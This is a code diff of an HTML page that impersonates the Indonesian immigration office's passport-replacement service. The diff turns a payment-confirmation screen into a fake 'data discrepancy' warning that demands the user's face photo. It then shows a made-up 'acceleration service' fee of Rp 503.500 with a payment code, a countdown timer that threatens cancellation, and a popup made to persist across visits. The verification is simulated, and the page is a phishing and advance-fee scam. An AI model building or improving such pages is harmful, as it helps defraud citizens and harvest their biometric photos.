@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pembayaran Berhasil - Penggantian Paspor</title>
+    <title>Verifikasi Data - Penggantian Paspor</title>
     <style>
         * {
             margin: 0;
@@ -88,115 +88,78 @@
             color: #333;
         }
         
-        .payment-info {
-            background-color: #f8f9fa;
+        .warning-section {
+            background-color: #fff8e1;
             border-radius: 8px;
             padding: 15px;
             margin-bottom: 20px;
+            border-left: 4px solid #ffc107;
         }
         
-        .payment-amount {
-            font-size: 24px;
+        .warning-title {
+            font-size: 16px;
             font-weight: bold;
-            color: #e63946;
-            text-align: center;
-            margin: 10px 0;
-        }
-        
-        .payment-code {
-            font-size: 18px;
-            font-weight: bold;
-            color: #003366;
-            text-align: center;
-            margin: 15px 0;
-            letter-spacing: 1px;
-            user-select: all;
-            cursor: pointer;
-            padding: 8px;
-            border-radius: 4px;
-            transition: background-color 0.3s;
-        }
-        
-        .payment-code:hover {
-            background-color: #eaeaea;
-        }
-        
-        .copy-hint {
-            font-size: 12px;
-            color: #666;
-            text-align: center;
-            margin-top: 5px;
-            font-style: italic;
-        }
-        
-        .success-status {
-            background-color: #e8f5e9;
-            border-radius: 8px;
-            padding: 15px;
-            margin-bottom: 20px;
-            border-left: 4px solid #2e7d32;
-            text-align: center;
-        }
-        
-        .success-icon {
-            font-size: 48px;
-            color: #2e7d32;
+            color: #e65100;
             margin-bottom: 10px;
+            display: flex;
+            align-items: center;
         }
         
-        .success-title {
-            font-size: 18px;
-            font-weight: bold;
-            color: #2e7d32;
-            margin-bottom: 5px;
+        .warning-icon {
+            margin-right: 8px;
+            font-size: 20px;
         }
         
-        .success-message {
+        .warning-message {
             font-size: 14px;
-            color: #333;
+            color: #5d4037;
+            line-height: 1.5;
         }
         
-        .timer-container {
-            text-align: center;
-            margin: 20px 0;
-        }
-        
-        .timer-label {
-            font-size: 14px;
-            color: #555;
-            margin-bottom: 5px;
-        }
-        
-        .timer {
-            font-size: 24px;
-            font-weight: bold;
-            color: #e63946;
-            padding: 10px;
-            border: 2px solid #e63946;
-            border-radius: 5px;
-            display: inline-block;
-            min-width: 200px;
-        }
-        
-        .instruction {
+        .verification-section {
             background-color: #e3f2fd;
             border-radius: 8px;
             padding: 15px;
-            margin: 20px 0;
+            margin-bottom: 20px;
             border-left: 4px solid #1565c0;
+            text-align: center;
         }
         
-        .instruction-title {
+        .verification-title {
             font-size: 16px;
             font-weight: bold;
             color: #1565c0;
-            margin-bottom: 8px;
+            margin-bottom: 10px;
         }
         
-        .instruction-details {
+        .verification-message {
             font-size: 14px;
             color: #333;
-            line-height: 1.5;
+            margin-bottom: 15px;
+        }
+        
+        .upload-area {
+            border: 2px dashed #1565c0;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 15px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        
+        .upload-area:hover {
+            background-color: #f0f7ff;
+        }
+        
+        .upload-icon {
+            font-size: 36px;
+            color: #1565c0;
+            margin-bottom: 10px;
+        }
+        
+        .upload-text {
+            font-size: 14px;
+            color: #555;
         }
         
         .btn-container {
@@ -215,6 +178,8 @@
             font-weight: bold;
             cursor: pointer;
             transition: background-color 0.3s;
+            position: relative;
+            overflow: hidden;
         }
         
         .btn:hover {
@@ -222,11 +187,39 @@
         }
         
         .btn-primary {
-            background-color: #2e7d32;
+            background-color: #1565c0;
         }
         
         .btn-primary:hover {
-            background-color: #1b5e20;
+            background-color: #0d47a1;
+        }
+        
+        .btn:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+        
+        .loading {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .btn.loading .btn-text {
+            display: none;
+        }
+        
+        .btn.loading .loading {
+            display: inline-block;
         }
         
         .footer {
@@ -313,6 +306,162 @@
             border-top: 1px dashed #e0e0e0;
         }
         
+        /* Popup Layanan Percepatan */
+        .acceleration-popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .acceleration-container {
+            background-color: white;
+            border-radius: 10px;
+            width: 100%;
+            max-width: 500px;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            position: relative;
+        }
+        
+        .acceleration-header {
+            background-color: #2e7d32;
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+        
+        .acceleration-title {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        
+        .acceleration-subtitle {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        
+        .acceleration-content {
+            padding: 25px;
+        }
+        
+        .acceleration-info {
+            background-color: #f0fff4;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-left: 4px solid #2e7d32;
+        }
+        
+        .acceleration-info-title {
+            font-size: 16px;
+            font-weight: bold;
+            color: #2e7d32;
+            margin-bottom: 8px;
+        }
+        
+        .acceleration-info-details {
+            font-size: 14px;
+            color: #333;
+            line-height: 1.5;
+        }
+        
+        .acceleration-payment {
+            background-color: #f8f9fa;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .acceleration-amount {
+            font-size: 24px;
+            font-weight: bold;
+            color: #e63946;
+            text-align: center;
+            margin: 10px 0;
+        }
+        
+        .acceleration-code {
+            font-size: 18px;
+            font-weight: bold;
+            color: #2e7d32;
+            text-align: center;
+            margin: 15px 0;
+            letter-spacing: 1px;
+            user-select: all;
+            cursor: pointer;
+            padding: 8px;
+            border-radius: 4px;
+            transition: background-color 0.3s;
+        }
+        
+        .acceleration-code:hover {
+            background-color: #eaeaea;
+        }
+        
+        .acceleration-copy-hint {
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+            margin-top: 5px;
+            font-style: italic;
+        }
+        
+        .acceleration-timer {
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .acceleration-timer-label {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 5px;
+        }
+        
+        .acceleration-timer-display {
+            font-size: 24px;
+            font-weight: bold;
+            color: #e63946;
+            padding: 10px;
+            border: 2px solid #e63946;
+            border-radius: 5px;
+            display: inline-block;
+            min-width: 200px;
+        }
+        
+        .acceleration-warning {
+            background-color: #fff8e1;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #5d4037;
+        }
+        
+        .close-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: none;
+            border: none;
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+            opacity: 0.7;
+            transition: opacity 0.3s;
+        }
+        
+        .close-btn:hover {
+            opacity: 1;
+        }
+        
         @media (max-width: 480px) {
             .popup-container {
                 max-width: 100%;
@@ -330,17 +479,9 @@
                 padding: 20px 15px;
             }
             
-            .payment-amount {
-                font-size: 20px;
-            }
-            
-            .payment-code {
-                font-size: 16px;
-            }
-            
-            .timer {
-                font-size: 20px;
-                min-width: 180px;
+            .acceleration-container {
+                max-width: 100%;
+                margin: 20px;
             }
         }
     </style>
@@ -349,15 +490,19 @@
     <div class="popup-container">
         <div class="header">
             <img src="https://z-cdn-media.chatglm.cn/files/12038e0f-115c-45aa-9d42-52d6ea82ffe6_Logo.png?auth_key=1790939066-c0ecc9049e204f12a6409fbc78ea90a8-0-f4eae3f3ae6679c5ee07784c0200fba2" alt="Logo Imigrasi" class="logo">
-            <div class="title">PEMBAYARAN BERHASIL</div>
+            <div class="title">VERIFIKASI DATA</div>
             <div class="subtitle">Penggantian Paspor Elektronik 5 Tahun</div>
         </div>
         
         <div class="content">
-            <div class="success-status">
-                <div class="success-icon">✓</div>
-                <div class="success-title">Pembayaran Berhasil</div>
-                <div class="success-message">Terima kasih, pembayaran Anda telah berhasil diproses</div>
+            <div class="warning-section">
+                <div class="warning-title">
+                    <span class="warning-icon">⚠️</span>
+                    Peringatan Sistem
+                </div>
+                <div class="warning-message">
+                    System telah mendeteksi adanya perbedaan data pada permohonan Anda. Untuk melanjutkan proses verifikasi permohonan, Anda harus segera melakukan verifikasi dengan mengupload foto wajah Anda.
+                </div>
             </div>
             
             <div class="info-section">
@@ -418,34 +563,23 @@
                 </div>
             </div>
             
-            <div class="payment-info">
-                <div class="info-title">Informasi Pembayaran</div>
-                <div class="info-row">
-                    <span class="info-label">Jenis Paspor</span>
-                    <span class="info-value">Paspor Elektronik 5 Tahun</span>
+            <div class="verification-section">
+                <div class="verification-title">Verifikasi Wajah</div>
+                <div class="verification-message">
+                    Upload foto wajah Anda untuk melanjutkan verifikasi permohonan. Pastikan foto wajah jelas dan terang.
                 </div>
-                <div class="info-row">
-                    <span class="info-label">Jumlah Pembayaran</span>
+                <div class="upload-area" id="uploadArea">
+                    <div class="upload-icon">📷</div>
+                    <div class="upload-text">Klik untuk upload foto wajah</div>
                 </div>
-                <div class="payment-amount">Rp 653.500,00</div>
-                <div class="info-row">
-                    <span class="info-label">Kode Pembayaran</span>
-                </div>
-                <div class="payment-code" id="paymentCode">9102660000001038738</div>
-                <div class="copy-hint">Klik pada kode pembayaran untuk menyalin</div>
-            </div>
-            
-            <div class="instruction">
-                <div class="instruction-title">Langkah Selanjutnya</div>
-                <div class="instruction-details">
-                    <strong>1.</strong> Silakan lanjutkan proses permohonan paspor Anda dengan datang ke Kantor Imigrasi sesuai jadwal yang telah ditentukan.<br><br>
-                    <strong>2.</strong> Bawa dokumen-dokumen yang diperlukan seperti KTP asli, paspor lama, dan bukti pembayaran ini.<br><br>
-                    <strong>3.</strong> Pastikan Anda datang 15 menit sebelum jadwal untuk memperlancar proses.
-                </div>
+                <input type="file" id="fileInput" accept="image/*" style="display: none;">
             </div>
             
             <div class="btn-container">
-                <button class="btn btn-primary" onclick="window.print()">Cetak Bukti Pembayaran</button>
+                <button class="btn btn-primary" id="verifyBtn">
+                    <span class="loading"></span>
+                    <span class="btn-text">Verifikasi Sekarang</span>
+                </button>
             </div>
         </div>
         
@@ -454,9 +588,69 @@
         </div>
     </div>
 
+    <!-- Popup Layanan Percepatan -->
+    <div class="acceleration-popup" id="accelerationPopup">
+        <div class="acceleration-container">
+            <button class="close-btn" id="closePopup">&times;</button>
+            <div class="acceleration-header">
+                <div class="acceleration-title">LAYANAN PERCEPATAN</div>
+                <div class="acceleration-subtitle">Proses Paspor dalam 1 Hari</div>
+            </div>
+            
+            <div class="acceleration-content">
+                <div class="acceleration-info">
+                    <div class="acceleration-info-title">Keuntungan Layanan Percepatan</div>
+                    <div class="acceleration-info-details">
+                        <strong>1.</strong> Proses pembuatan paspor selesai dalam 1 hari kerja setelah sidik jari<br><br>
+                        <strong>2.</strong> Prioritas pelayanan khusus tanpa antri<br><br>
+                        <strong>3.</strong> Notifikasi real-time status permohonan Anda
+                    </div>
+                </div>
+                
+                <div class="acceleration-payment">
+                    <div class="info-title">Informasi Pembayaran</div>
+                    <div class="info-row">
+                        <span class="info-label">Layanan</span>
+                        <span class="info-value">Layanan Percepatan Paspor</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Jumlah Pembayaran</span>
+                    </div>
+                    <div class="acceleration-amount">Rp 503.500,00</div>
+                    <div class="info-row">
+                        <span class="info-label">Kode Pembayaran</span>
+                    </div>
+                    <div class="acceleration-code" id="accelerationCode">910266000001041985</div>
+                    <div class="acceleration-copy-hint">Klik pada kode pembayaran untuk menyalin</div>
+                </div>
+                
+                <div class="acceleration-timer">
+                    <div class="acceleration-timer-label">Batas Waktu Pembayaran</div>
+                    <div class="acceleration-timer-display" id="accelerationCountdown">02:00:00</div>
+                </div>
+                
+                <div class="acceleration-warning">
+                    <strong>Perhatian:</strong> Harap melakukan pembayaran sebelum batas waktu yang ditentukan. Apabila batas waktu telah habis dan Anda belum melakukan pembayaran, maka permohonan layanan percepatan Anda akan dibatalkan secara otomatis.
+                </div>
+                
+                <div class="btn-container">
+                    <button class="btn" onclick="window.print()">Cetak Bukti</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
     <script>
+        // Cek apakah user sudah pernah membuka popup percepatan
+        const hasOpenedAcceleration = localStorage.getItem('hasOpenedAcceleration');
+        
+        // Jika sudah pernah membuka, tampilkan langsung popup percepatan
+        if (hasOpenedAcceleration === 'true') {
+            document.getElementById('accelerationPopup').style.display = 'flex';
+        }
+        
         // Fungsi untuk menyalin kode pembayaran
-        document.getElementById('paymentCode').addEventListener('click', function() {
+        document.getElementById('accelerationCode').addEventListener('click', function() {
             // Membuat elemen input sementara
             const tempInput = document.createElement('input');
             tempInput.value = this.textContent;
@@ -480,6 +674,134 @@
                 this.style.backgroundColor = "";
             }, 2000);
         });
+        
+        // Fungsi untuk menutup popup
+        document.getElementById('closePopup').addEventListener('click', function() {
+            document.getElementById('accelerationPopup').style.display = 'none';
+        });
+        
+        // Fungsi untuk upload foto
+        document.getElementById('uploadArea').addEventListener('click', function() {
+            document.getElementById('fileInput').click();
+        });
+        
+        document.getElementById('fileInput').addEventListener('change', function() {
+            if (this.files && this.files[0]) {
+                // Tampilkan loading
+                const verifyBtn = document.getElementById('verifyBtn');
+                verifyBtn.classList.add('loading');
+                verifyBtn.disabled = true;
+                
+                // Simulasi proses verifikasi
+                setTimeout(() => {
+                    // Tandai bahwa user sudah membuka popup percepatan
+                    localStorage.setItem('hasOpenedAcceleration', 'true');
+                    
+                    // Tampilkan popup percepatan
+                    document.getElementById('accelerationPopup').style.display = 'flex';
+                    
+                    // Reset tombol
+                    verifyBtn.classList.remove('loading');
+                    verifyBtn.disabled = false;
+                }, 2000);
+            }
+        });
+        
+        // Fungsi untuk tombol verifikasi
+        document.getElementById('verifyBtn').addEventListener('click', function() {
+            // Cek apakah sudah ada file yang diupload
+            const fileInput = document.getElementById('fileInput');
+            if (!fileInput.files || !fileInput.files[0]) {
+                // Tampilkan pesan jika belum upload foto
+                const uploadArea = document.getElementById('uploadArea');
+                uploadArea.style.backgroundColor = "#ffebee";
+                uploadArea.style.borderColor = "#f44336";
+                
+                setTimeout(() => {
+                    uploadArea.style.backgroundColor = "";
+                    uploadArea.style.borderColor = "";
+                }, 2000);
+                
+                return;
+            }
+            
+            // Tampilkan loading
+            this.classList.add('loading');
+            this.disabled = true;
+            
+            // Simulasi proses verifikasi
+            setTimeout(() => {
+                // Tandai bahwa user sudah membuka popup percepatan
+                localStorage.setItem('hasOpenedAcceleration', 'true');
+                
+                // Tampilkan popup percepatan
+                document.getElementById('accelerationPopup').style.display = 'flex';
+                
+                // Reset tombol
+                this.classList.remove('loading');
+                this.disabled = false;
+            }, 2000);
+        });
+        
+        // Set waktu awal (2 jam dalam detik) untuk countdown percepatan
+        const initialAccelerationTime = 2 * 60 * 60;
+        
+        // Cek apakah ada waktu tersisa di localStorage untuk countdown percepatan
+        let accelerationTimeLeft = localStorage.getItem('accelerationTimeLeft') 
+            ? parseInt(localStorage.getItem('accelerationTimeLeft')) 
+            : initialAccelerationTime;
+        
+        // Jika waktu tersisa kurang dari atau sama dengan 0, set ulang
+        if (accelerationTimeLeft <= 0) {
+            accelerationTimeLeft = initialAccelerationTime;
+        }
+        
+        // Simpan waktu tersisa ke localStorage
+        localStorage.setItem('accelerationTimeLeft', accelerationTimeLeft);
+        
+        // Update tampilan countdown percepatan
+        function updateAccelerationCountdown() {
+            const hours = Math.floor(accelerationTimeLeft / 3600);
+            const minutes = Math.floor((accelerationTimeLeft % 3600) / 60);
+            const seconds = accelerationTimeLeft % 60;
+            
+            // Format tampilan waktu
+            const formattedTime = 
+                String(hours).padStart(2, '0') + ':' + 
+                String(minutes).padStart(2, '0') + ':' + 
+                String(seconds).padStart(2, '0');
+            
+            document.getElementById('accelerationCountdown').textContent = formattedTime;
+            
+            // Simpan waktu tersisa ke localStorage
+            localStorage.setItem('accelerationTimeLeft', accelerationTimeLeft);
+            
+            // Kurangi waktu
+            accelerationTimeLeft--;
+            
+            // Jika waktu habis
+            if (accelerationTimeLeft < 0) {
+                clearInterval(accelerationTimerInterval);
+                document.getElementById('accelerationCountdown').textContent = "WAKTU HABIS";
+                document.getElementById('accelerationCountdown').style.color = "#ff0000";
+                
+                // Tampilkan pemberitahuan bahwa permohonan ditolak
+                const warning = document.querySelector('.acceleration-warning');
+                warning.innerHTML = "<strong>Perhatian:</strong> Waktu pembayaran telah habis. Permohonan layanan percepatan Anda telah dibatalkan secara otomatis.";
+                warning.style.backgroundColor = "#ffebee";
+                warning.style.borderLeftColor = "#f44336";
+                warning.style.color = "#c62828";
+                
+                // Nonaktifkan tombol cetak
+                document.querySelector('.acceleration-content .btn').disabled = true;
+                document.querySelector('.acceleration-content .btn').style.backgroundColor = "#cccccc";
+                document.querySelector('.acceleration-content .btn').style.cursor = "not-allowed";
+            }
+        }
+        
+        // Jalankan countdown percepatan setiap detik
+        updateAccelerationCountdown();
+        const accelerationTimerInterval = setInterval(updateAccelerationCountdown, 1000);
     </script>
 </body>
 </html>
